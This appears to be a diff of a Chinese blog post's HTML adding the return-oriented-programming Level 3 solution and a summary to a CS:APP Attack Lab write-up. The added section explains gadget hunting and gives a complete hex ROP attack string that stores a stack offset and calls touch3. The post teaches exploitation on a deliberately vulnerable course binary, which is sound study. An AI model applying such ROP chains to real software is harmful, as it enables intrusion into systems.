@@ -94,7 +94,7 @@
 <meta name="description" content="Attack Lab实验代码见GitHub 简介Attack Lab的内容针对的是CS-APP中第三章中关于程序安全性描述中的栈溢出攻击。在这个Lab中，我们需要针对不同的目的编写攻击字符串来填充一个有漏洞的程序的栈来达到执行攻击代码的目的，攻击方式分为代码注入攻击与返回导向编程攻击。本实验也是对旧版本中IA32编写的Buffer Lab的替代。 我们可以从CMU的lab主页来获取自学者版本与实验">
 <meta name="keywords" content="Computer System,CS:APP">
 <meta property="og:type" content="article">
-<meta property="og:title" content="深入理解计算机系统（CS:APP) - Attack Lab解题报告">
+<meta property="og:title" content="深入理解计算机系统（CS:APP) - Attack Lab详解">
 <meta property="og:url" content="http://www.viseator.com/2017/07/18/CS_APP_AttackLab/index.html">
 <meta property="og:site_name" content="viseator&#39;s blog">
 <meta property="og:description" content="Attack Lab实验代码见GitHub 简介Attack Lab的内容针对的是CS-APP中第三章中关于程序安全性描述中的栈溢出攻击。在这个Lab中，我们需要针对不同的目的编写攻击字符串来填充一个有漏洞的程序的栈来达到执行攻击代码的目的，攻击方式分为代码注入攻击与返回导向编程攻击。本实验也是对旧版本中IA32编写的Buffer Lab的替代。 我们可以从CMU的lab主页来获取自学者版本与实验">
@@ -103,9 +103,11 @@
 <meta property="og:image" content="http://www.viseator.com/images/attacklab03.png">
 <meta property="og:image" content="http://www.viseator.com/images/attacklab04.png">
 <meta property="og:image" content="http://www.viseator.com/images/attacklab05.png">
-<meta property="og:updated_time" content="2017-07-18T11:43:50.304Z">
+<meta property="og:image" content="http://www.viseator.com/images/attacklab06.png">
+<meta property="og:image" content="http://www.viseator.com/images/attacklab07.png">
+<meta property="og:updated_time" content="2017-07-18T12:31:59.924Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="深入理解计算机系统（CS:APP) - Attack Lab解题报告">
+<meta name="twitter:title" content="深入理解计算机系统（CS:APP) - Attack Lab详解">
 <meta name="twitter:description" content="Attack Lab实验代码见GitHub 简介Attack Lab的内容针对的是CS-APP中第三章中关于程序安全性描述中的栈溢出攻击。在这个Lab中，我们需要针对不同的目的编写攻击字符串来填充一个有漏洞的程序的栈来达到执行攻击代码的目的，攻击方式分为代码注入攻击与返回导向编程攻击。本实验也是对旧版本中IA32编写的Buffer Lab的替代。 我们可以从CMU的lab主页来获取自学者版本与实验">
 <meta name="twitter:image" content="http://www.viseator.com/images/attacklab01.png">
 
@@ -141,7 +143,7 @@
 
 
 
-  <title>深入理解计算机系统（CS:APP) - Attack Lab解题报告 | viseator's blog</title>
+  <title>深入理解计算机系统（CS:APP) - Attack Lab详解 | viseator's blog</title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -366,7 +368,7 @@
 
         
         
-          <h2 class="post-title" itemprop="name headline">深入理解计算机系统（CS:APP) - Attack Lab解题报告</h2>
+          <h2 class="post-title" itemprop="name headline">深入理解计算机系统（CS:APP) - Attack Lab详解</h2>
         
 
         <div class="post-meta">
@@ -429,7 +431,7 @@
 
           
           
-             <span id="/2017/07/18/CS_APP_AttackLab/" class="leancloud_visitors" data-flag-title="深入理解计算机系统（CS:APP) - Attack Lab解题报告">
+             <span id="/2017/07/18/CS_APP_AttackLab/" class="leancloud_visitors" data-flag-title="深入理解计算机系统（CS:APP) - Attack Lab详解">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -454,7 +456,7 @@
                   <span class="post-meta-item-text">字数统计</span>
                 
                 <span title="字数统计">
-                  3,767
+                  4,739
                 </span>
               
 
@@ -566,6 +568,27 @@
 <p>中最后的字节<code>48 89 c7 90 c3</code>编码了这样的指令。</p>
 <p>我们分别计算这些需要执行的<code>gadget</code>的指令地址，写成攻击字符串：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">00 00 00 00 00 00 00 00 </div><div class="line">00 00 00 00 00 00 00 00 </div><div class="line">00 00 00 00 00 00 00 00 </div><div class="line">00 00 00 00 00 00 00 00 </div><div class="line">00 00 00 00 00 00 00 00 # 前0x28个字符填充0x00</div><div class="line">ab 19 40 00 00 00 00 00 # popq %rax </div><div class="line">fa 97 b9 59 00 00 00 00 # cookie （popq的目标）</div><div class="line">a2 19 40 00 00 00 00 00 # movq %rax,%rdi</div><div class="line">ec 17 40 00 00 00 00 00 # 返回到 touch2</div></pre></td></tr></table></figure>
+<h4 id="Level-3-1"><a href="#Level-3-1" class="headerlink" title="Level 3"></a>Level 3</h4><p>攻击目标与之前的<code>Level 3</code>相同，需要将<code>rdi</code>指向<code>cookie</code>的字符串表示的首地址。</p>
+<p>目标字符串毫无疑问还是存放在栈中的，但是我们如何在栈地址随机化的情况下去获取我们放在栈中的字符串的首地址呢？</p>
+<p>查看<code>gadget_farm</code>中提供的<code>gadget</code>后，我们可以发现可以执行的命令中有</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">movq %rsp,%rax</div><div class="line">ret</div></pre></td></tr></table></figure>
+<p>这样一条，可以保存当前的<code>rsp</code>值，但是我们面临一个问题，这条命令执行时<code>rsp</code>的值为下一个地址，如果下一个地址中存放了目标字符串，那么命令就无法继续执行下去，也无法进入<code>touch3</code>函数了。</p>
+<p>除此之外，似乎没有别的<code>gadget</code>可以帮助我们获取<code>rsp</code>的地址了。</p>
+<p>我在这个地方卡了好几个小时，最后在别人的提示下才发现<code>gadget_farm</code>中有这样一个<code>gadget</code>画风与其他的不太一样：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">00000000004019d6 &lt;add_xy&gt;: </div><div class="line">  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax</div><div class="line">  4019da:	c3                   	retq</div></pre></td></tr></table></figure>
+<p>这明明就是一个可以直接使用的函数！它的作用是将<code>rdi</code>与<code>rsi</code>中的值相加后存放在<code>rax</code>中。</p>
+<p>有了这个，我们就可以把<code>rsp</code>的值加上一个数偏移若干后表示存放目标字符串的位置，就不会与需要执行的指令冲突了。</p>
+<p>同时还要注意的是，这里有些<code>gadget</code>藏得比较隐蔽，讲义中暗示我们有一些两字节编码的指令实际上没有任何影响，它们之前的指令同样也是可以使用的。</p>
+<p>仔细找出所有可以执行的指令并整理之后我得出了这样一张图：</p>
+<p><img src="/images/attacklab06.png" alt=""></p>
+<p>目标字符串存放的位置一定在<code>touch3</code>地址之上（原因见前文）。</p>
+<p>由于相加操作只能对<code>rsi</code>与<code>rdi</code>进行，经过观察可以发现栈地址是一个8字节值，所以无法通过下面这条<code>movl</code>组成的路来传递，但是我们的偏移值完全可以。所以我们的思路就定下了，把<code>rsp</code>的值存放在<code>rdi</code>中，把偏移量的值通过<code>popq</code>指令从栈中取出放在<code>esi</code>中，再利用<code>add_xy</code>函数将它们相加的结果存放到<code>rax</code>再转移到<code>rdi</code>中。这个偏移量是多少要等到我们的栈结构出来之后才可以确定。</p>
+<p>根据上面这些信息，我们可以把栈结构示意出来：</p>
+<p><img src="/images/attacklab07.png" alt=""></p>
+<p>标注灰色的地方是我们计算偏移量的部分（从<code>rsp</code>读入时开始），可以计算出偏移量为<code>4 x 8 = 32 = 0x20</code>，再依此计算各命令的地址、构建出我们的攻击字符串：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">00 00 00 00 00 00 00 00 </div><div class="line">00 00 00 00 00 00 00 00 </div><div class="line">00 00 00 00 00 00 00 00 </div><div class="line">00 00 00 00 00 00 00 00 </div><div class="line">00 00 00 00 00 00 00 00 # 前0x28个字符填充0x00</div><div class="line">cc 19 40 00 00 00 00 00 # popq %rax</div><div class="line">20 00 00 00 00 00 00 00 # 偏移量</div><div class="line">42 1a 40 00 00 00 00 00 # movl %eax,%edx</div><div class="line">69 1a 40 00 00 00 00 00 # movl %edx,%ecx</div><div class="line">27 1a 40 00 00 00 00 00 # movl %ecx,%esi</div><div class="line">06 1a 40 00 00 00 00 00 # movq %rsp,%rax</div><div class="line">c5 19 40 00 00 00 00 00 # movq %rax,%rdi</div><div class="line">d6 19 40 00 00 00 00 00 # add_xy</div><div class="line">c5 19 40 00 00 00 00 00 # movq %rax,%rdi</div><div class="line">fa 18 40 00 00 00 00 00 # touch3地址</div><div class="line">35 39 62 39 39 37 66 61 # 目标字符串</div><div class="line">00 00 00 00 00 00 00 00</div></pre></td></tr></table></figure>
+<h3 id="实验小结"><a href="#实验小结" class="headerlink" title="实验小结"></a>实验小结</h3><p><code>Attack Lab</code>与之前的两个实验相比还是比较简单的，但是最后一个阶段确实因为自己的观察不够细致浪费了大量的时间。也告诉我们不要受思维定势的左右，一味地去寻找可以使用的<code>gadget</code>而忽略了函数本身的作用。</p>
+<p>这次实验加强了我对于函数调用栈，字节序，<code>gdb</code>使用，汇编的理解。</p>
 
       
     </div>
@@ -807,7 +830,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Attack-Lab"><span class="nav-number">1.</span> <span class="nav-text">Attack Lab</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#简介"><span class="nav-number">1.1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#前置"><span class="nav-number">1.2.</span> <span class="nav-text">前置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第一部分：代码注入攻击"><span class="nav-number">1.3.</span> <span class="nav-text">第一部分：代码注入攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Level１"><span class="nav-number">1.3.1.</span> <span class="nav-text">Level１</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Level-2"><span class="nav-number">1.3.2.</span> <span class="nav-text">Level 2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Level-3"><span class="nav-number">1.3.3.</span> <span class="nav-text">Level 3</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第二部分：返回导向编程攻击"><span class="nav-number">1.4.</span> <span class="nav-text">第二部分：返回导向编程攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#攻击方式"><span class="nav-number">1.4.1.</span> <span class="nav-text">攻击方式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Level-2-1"><span class="nav-number">1.4.2.</span> <span class="nav-text">Level 2</span></a></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Attack-Lab"><span class="nav-number">1.</span> <span class="nav-text">Attack Lab</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#简介"><span class="nav-number">1.1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#前置"><span class="nav-number">1.2.</span> <span class="nav-text">前置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第一部分：代码注入攻击"><span class="nav-number">1.3.</span> <span class="nav-text">第一部分：代码注入攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Level１"><span class="nav-number">1.3.1.</span> <span class="nav-text">Level１</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Level-2"><span class="nav-number">1.3.2.</span> <span class="nav-text">Level 2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Level-3"><span class="nav-number">1.3.3.</span> <span class="nav-text">Level 3</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第二部分：返回导向编程攻击"><span class="nav-number">1.4.</span> <span class="nav-text">第二部分：返回导向编程攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#攻击方式"><span class="nav-number">1.4.1.</span> <span class="nav-text">攻击方式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Level-2-1"><span class="nav-number">1.4.2.</span> <span class="nav-text">Level 2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Level-3-1"><span class="nav-number">1.4.3.</span> <span class="nav-text">Level 3</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#实验小结"><span class="nav-number">1.5.</span> <span class="nav-text">实验小结</span></a></li></ol></li></ol></div>
             
 
           </div>
